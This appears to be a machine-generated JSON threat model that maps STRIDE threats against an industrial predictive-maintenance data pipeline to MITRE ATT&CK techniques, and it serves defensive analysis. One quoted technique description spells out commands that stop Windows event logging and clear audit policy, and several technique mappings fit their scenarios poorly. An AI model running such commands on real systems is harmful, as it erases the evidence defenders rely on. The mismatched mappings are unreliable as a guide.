[
{
    "case_number": "9",
    "batch_number": "1",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers may spoof sensor data by injecting fabricated data packets, misleading the predictive maintenance and optimization models.",
            "Assumptions": [
                {
                    "Assumption": "Attackers have access to the network where sensors communicate.",
                    "Role": "Attacker",
                    "Condition": "Valid if network security controls are weak."
                },
                {
                    "Assumption": "Data integrity checks are not sufficiently robust.",
                    "Role": "System Administrator",
                    "Condition": "Valid if integrity validation mechanisms are bypassed."
                },
                {
                    "Assumption": "No mutual authentication between sensors and the data logger.",
                    "Role": "System Designer",
                    "Condition": "Valid in the absence of robust authentication protocols."
                }
            ],
            "Potential Impact": "Unauthorized data injection can lead to incorrect predictions, compromising system integrity.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Network",
                "Data Injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers may use compromised credentials to access the dashboard, posing as legitimate employees to manipulate data or view sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are stolen through phishing or other social engineering techniques.",
                    "Role": "Attacker",
                    "Condition": "Valid if employees fall for phishing scams."
                },
                {
                    "Assumption": "Lack of strong multi-factor authentication.",
                    "Role": "System Administrator",
                    "Condition": "Valid if only single-factor authentication is used."
                },
                {
                    "Assumption": "User behavior monitoring is ineffective.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if anomalous access patterns go undetected."
                }
            ],
            "Potential Impact": "Unauthorized access to the dashboard can lead to data disclosure and manipulation, compromising data confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Credential Access",
                "Dashboard"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary impersonates the data logger to send fake data to the receiver, disrupting the data flow and analysis.",
            "Assumptions": [
                {
                    "Assumption": "Impersonation of data logger is technically possible on the network.",
                    "Role": "Attacker",
                    "Condition": "Valid in absence of mutual authentication."
                },
                {
                    "Assumption": "The receiver does not validate the authenticity of incoming data adequately.",
                    "Role": "System Engineer",
                    "Condition": "Valid if identity validation mechanisms are weak."
                },
                {
                    "Assumption": "Role-based access controls are insufficient.",
                    "Role": "System Administrator",
                    "Condition": "Valid if role-based access mechanisms are lax or misconfigured."
                }
            ],
            "Potential Impact": "Data flow disruption can lead to system downtime, affecting data availability.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Impersonation",
                "Data Disruption"
            ],
            "mitre_technique": {
                "name": "Impersonation",
                "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
                "technique_id": "T1656"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attackers could tamper with data in transit between the sensors and the data logger, altering the collected parameters.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are unencrypted.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if encryption is not enforced."
                },
                {
                    "Assumption": "Attackers have network access to intercept communications.",
                    "Role": "Attacker",
                    "Condition": "Valid if network security is compromised."
                },
                {
                    "Assumption": "Integrity checks at the data logger are inadequate.",
                    "Role": "System Engineer",
                    "Condition": "Valid if data integrity mechanisms are insufficient."
                }
            ],
            "Potential Impact": "Tampered data can mislead the AI/ML models, affecting data integrity and leading to incorrect maintenance predictions.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Data Corruption",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider with access to the TOREADOR platform modifies or corrupts the pre-processed data, invalidating the AI/ML model training.",
            "Assumptions": [
                {
                    "Assumption": "Insider has sufficient privileges to access and modify stored data.",
                    "Role": "Insider",
                    "Condition": "Valid if access controls are loosely enforced."
                },
                {
                    "Assumption": "Insider actions are not properly logged or monitored.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if audit logs are minimal or poorly reviewed."
                },
                {
                    "Assumption": "No encryption on data at rest.",
                    "Role": "Database Administrator",
                    "Condition": "Valid if data is stored in unencrypted form."
                }
            ],
            "Potential Impact": "Tampering with training data affects data integrity, leading to degraded model performance and unreliable predictions.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Insider Threat",
                "Pre-processing"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware on the data logger tampers with data before it is sent to the receiver.",
            "Assumptions": [
                {
                    "Assumption": "Data logger is infected due to insufficient endpoint security.",
                    "Role": "Attacker",
                    "Condition": "Valid if malware protection is suboptimal."
                },
                {
                    "Assumption": "Malware evades detection from security tools in place.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if malware detection capabilities are outdated."
                },
                {
                    "Assumption": "No integrity checks before data transmission.",
                    "Role": "System Designer",
                    "Condition": "Valid if there is no validation of data integrity before transmission."
                }
            ],
            "Potential Impact": "Tampered data affects predictive maintenance and power optimization, impacting data integrity.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Malware",
                "Data Integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker might deny actions performed on the dashboard by exploiting insufficient logging mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are inadequate.",
                    "Role": "System Administrator",
                    "Condition": "Valid if insufficient logging policies are in place."
                },
                {
                    "Assumption": "Logs are not tamper-proof.",
                    "Role": "System Engineer",
                    "Condition": "Valid if logs can be modified or deleted."
                },
                {
                    "Assumption": "Access controls to log records are weak.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if access to logs is not properly governed."
                }
            ],
            "Potential Impact": "Inability to trace actions affects accountability, compromising data integrity and making incident response difficult.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Logging",
                "Accountability"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Insufficient logging allows an insider to modify data within the TOREADOR platform and deny actions, evading detection.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms do not cover all critical actions.",
                    "Role": "System Administrator",
                    "Condition": "Valid if comprehensive activity logging is not enforced."
                },
                {
                    "Assumption": "Logs are not monitored regularly.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if there is no active log monitoring."
                },
                {
                    "Assumption": "Logs are stored in a non-secure manner.",
                    "Role": "Database Administrator",
                    "Condition": "Valid if logs can be accessed and altered without restriction."
                }
            ],
            "Potential Impact": "Repudiation of actions affects data integrity, as unauthorized modifications cannot be traced back to the perpetrator.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Insider Threat",
                "Log Tampering"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Tampered logs prevent accurate forensic analysis post-incident within the LIGHT-TOREADOR infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "Log tampering is technically possible within the system.",
                    "Role": "Attacker",
                    "Condition": "Valid if logs are centrally managed without tamper protection."
                },
                {
                    "Assumption": "No integrity validation on log files.",
                    "Role": "System Designer",
                    "Condition": "Valid if log files are not validated for integrity."
                },
                {
                    "Assumption": "Insufficient backup mechanisms for log files.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logging infrastructure does not include secure backups."
                }
            ],
            "Potential Impact": "Tampered logs affect the accuracy of forensic analysis, complicating incident response and remediation efforts.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Log Manipulation",
                "Forensic Analysis"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data in transit from sensors to the data logger, accessing sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Communication is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Valid if data is transmitted in plain text."
                },
                {
                    "Assumption": "Attackers can access communication channels.",
                    "Role": "Attacker",
                    "Condition": "Valid if network security is inadequate."
                },
                {
                    "Assumption": "Passive monitoring tools are in place for data interception.",
                    "Role": "Attacker",
                    "Condition": "Valid if attackers deploy network sniffers undetected."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information affects data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Interception",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Weak access controls on the TOREADOR platform lead to unauthorized access to sensitive pre-processed data.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are improperly configured.",
                    "Role": "System Administrator",
                    "Condition": "Valid if least privilege principle is not enforced."
                },
                {
                    "Assumption": "Insider access is not adequately monitored.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if there is no effective insider threat detection."
                },
                {
                    "Assumption": "There is a mix of sensitive and non-sensitive data without appropriate segregation.",
                    "Role": "Data Modeler",
                    "Condition": "Valid if sensitive data is not properly segregated."
                }
            ],
            "Potential Impact": "Unauthorized access affects data confidentiality and can lead to data breaches.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Weak Access Controls",
                "Data Breach"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An external attacker could employ social engineering techniques to gain employee access credentials, thus exposing sensitive predictive maintenance data.",
            "Assumptions": [
                {
                    "Assumption": "Employees are susceptible to social engineering attacks.",
                    "Role": "Employee",
                    "Condition": "Valid if there is insufficient security awareness training."
                },
                {
                    "Assumption": "Sensitive data is accessible upon login without additional access checks.",
                    "Role": "System Engineer",
                    "Condition": "Valid if no additional verification is needed after login."
                },
                {
                    "Assumption": "Insufficient monitoring of access patterns to detect anomalies.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if monitoring tools and protocols are weak or absent."
                }
            ],
            "Potential Impact": "Unauthorized data access affects data confidentiality, risking data breaches.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Social Engineering",
                "Credential Theft"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack on the LIGHT ICT infrastructure disrupts data transmission and affecting system availability.",
            "Assumptions": [
                {
                    "Assumption": "No adequate DDoS protection mechanisms in place.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if protections like rate limiting and improved firewall rules are not implemented."
                },
                {
                    "Assumption": "Attackers use botnets to produce a high volume of traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid if botnet activity is unmonitored or unmitigated."
                },
                {
                    "Assumption": "Scalability issues during load spikes.",
                    "Role": "System Architect",
                    "Condition": "Valid if system infrastructure can't scale to handle peak loads."
                }
            ],
            "Potential Impact": "Data transmission disruption affects system availability, leading to potential downtime.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS",
                "System Disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects the data logger, causing it to crash and stop forwarding data to the receiver.",
            "Assumptions": [
                {
                    "Assumption": "Data logger lacks robust malware protection.",
                    "Role": "System Administrator",
